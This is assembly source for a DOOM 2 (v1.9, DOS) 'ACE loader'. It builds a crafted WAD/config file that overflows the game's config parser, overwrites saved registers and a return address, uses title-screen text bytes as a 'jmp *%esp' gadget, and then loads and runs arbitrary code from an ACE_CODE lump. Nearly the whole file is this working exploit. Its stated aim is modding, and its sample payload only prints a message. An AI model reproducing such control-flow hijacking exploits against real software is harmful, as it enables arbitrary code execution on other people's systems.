//// kgsws' DOOM2 ACE engine
// ACE LOADER source code - this creates a valid WAD file.
// Generated file has to be loaded using '-config'.
// ACE_CODE lump should be replaced with ACE Engine.
//////////////////////////////
//
// The exploit actually uses Doom title text as an executable code.
// This is probably the only guaranteed byte stream with known location.
// For compatibility with shareware version there are two variations, both handled by the same exploit.
// All this works because of luck. Luck that those texts happen to translate into useful opcodes.
// Well, at least indirectly. Useful opcode modifies next instruction for something better - 'jmp *%esp'.
//
// "DOOM 2: Hell on Earth v1.9"
// 76 74                	jbe    0x76
// 31 74 2e 74          	xor    %esi,0x74(%esi,%ebp,1)
// 39 74 20 74          	cmp    %esi,0x74(%eax,%eiz,1)
//
// "DOOM System Startup v1.9"
// 31 74 2e 74          	xor    %esi,0x74(%esi,%ebp,1)
// 39 74 20 74          	cmp    %esi,0x74(%eax,%eiz,1)
// 20 74 20 74          	and    %dh,0x74(%eax,%eiz,1)
//
// XOR with 0x90C690C6 from 0x74397439 to 0xE4FFE4FF
// addr	0x000B8062
// ESI	0x90C690C6
// EBP	0x6F44EF28
//

.section .text
.globl _start

_start:
	// WAD header
	.ascii	"PWAD"
	.4byte	0x00000002
	.4byte	wad_lumps-_start

ace_ldr_start:
	// dummy config option
	.ascii	"THE ACE LOADER\r\n\r\n"

	// dummy config option name + separator
	.ascii	"x\t"

	//// This part has to contain exact number of any characters except NEWLINE (0x0D or 0x0A) or EOF (0x1A).

	// credits
	.ascii	"+--------------+"
	.ascii	"|  Arbitrary   |"
	.ascii	"|     code     |"
	.ascii	"|  execution   |"
	.ascii	"|              |"
	.ascii	"|     for      |"
	.ascii	"|    DOOM 2    |"
	.ascii	"|              |"
	.ascii	"|   by kgsws   |"
	.ascii	"+--------------+"
	.ascii	"\\______________/"

	// filler
	.ascii	"........"

	// This is a pointer to FILE structure. It is used in feof() call to stop the parsing loop.
	// Target location should be valid and act as if EOF flag is set.
	.4byte	0x000b8001

	// value of EBP
	.4byte	0x6F44EF28

	// value of EDI
	.4byte	0x00000000

	// value of ESI
	.4byte	0x90C690C6

	// value of EDX
	.4byte	0x00000000

	// value of ECX
	.4byte	0x00000000

	// value of EBX
	.4byte	0x00000000

	// the exploit - address to jump at
	.4byte	0x000b805e

	// End of length critical part.

	//
	// The Code

	// recover base pointer
	mov	-232(%esp),%esi

	// recover DATA pointer
	mov	5(%esi),%edi
	sub	$0x2b6e4,%edi	// EDI contains DATA base

	// recover CODE pointer
	sub	$0x24540,%esi	// ESI contains CODE base

	// get ace WAD name
	// this is 'defaultfile' right now
	mov	0x2B6E0(%edi),%eax

	// open
	push	$0x200
	push	%eax
	lea	0x40691(%esi),%eax
	call	*%eax
	mov	%eax,%ebp

	// read header
	mov	$12,%ebx
	lea	0x2C150(%edi),%edx
	lea	0x40935(%esi),%ecx
	call	*%ecx

	// get entry count
	mov	0x2C154(%edi),%eax
	inc	%eax
	push	%eax

	// seek to entries
	mov	%ebp,%eax
	mov	0x2C158(%edi),%edx
	xor	%ebx,%ebx
	lea	0x408c0(%esi),%ecx
	call	*%ecx

	// find 'ACE_CODE'
ace_loop:
	// check for error
	decl	(%esp)
	jz	exit
	// read entry
	mov	%ebp,%eax
	mov	$16,%ebx
	lea	0x2C12C(%edi),%edx
	lea	0x40935(%esi),%ecx
	call	*%ecx
	// name check
	cmpl	$0x5f454341,0x2C134(%edi)
	jne	ace_loop
	cmpl	$0x45444f43,0x2C138(%edi)
	jne	ace_loop

	// seek to 'ACE_CODE'
	mov	%ebp,%eax
	mov	0x2C12C(%edi),%edx
	xor	%ebx,%ebx
	lea	0x408c0(%esi),%ecx
	call	*%ecx

	// read .BSS size
	mov	%ebp,%eax
	mov	$4,%ebx
	lea	0x2C140(%edi),%edx
	lea	0x40935(%esi),%ecx
	call	*%ecx

	// allocate memory for 'ACE_CODE', with .BSS
	mov	0x2C140(%edi),%eax
	add	0x2C130(%edi),%eax
	add	$32,%eax // extra padding
	lea	0x40602(%esi),%ecx
	call	*%ecx
	test	%eax,%eax
	jz	exit
	push	%eax

	// read 'ACE_CODE'
	mov	0x2C130(%edi),%ebx
	mov	%eax,%edx
	mov	%ebp,%eax
	lea	0x40935(%esi),%ecx
	call	*%ecx

	// close
	mov	%ebp,%eax
	lea	0x40902(%esi),%ecx
	call	*%ecx

	// start 'ACE_CODE'
	jmp	*(%esp)

exit:
	// exit
	mov	$0x4c01,%ax
	int	$0x21

	// EOF
	.byte	0x1a
ace_ldr_end:

	// dummy ACE_CODE
ace_code_start:
	// size of .bss
	.4byte	0x00000B55
_code_start:
	// get address of 'printf' function
	mov	$0x3FE40,%eax
	add	%esi,%eax

	// get address of custom text
	mov	$_code_text-_code_start,%ebx
	add	(%esp),%ebx

	// push text
	push	%ebx

	// call 'printf'
	call *%eax

	// exit to DOS
	mov	$0x4c01,%ax
	int	$0x21

	// the text
_code_text:
	.string	"Replace ACE_CODE with your code!"

ace_code_end:

wad_lumps:
	.4byte	ace_ldr_start-_start
	.4byte	ace_ldr_end-ace_ldr_start
	.ascii	"ACE_LDR\0"
	.4byte	ace_code_start-_start
	.4byte	ace_code_end-ace_code_start
	.ascii	"ACE_CODE"

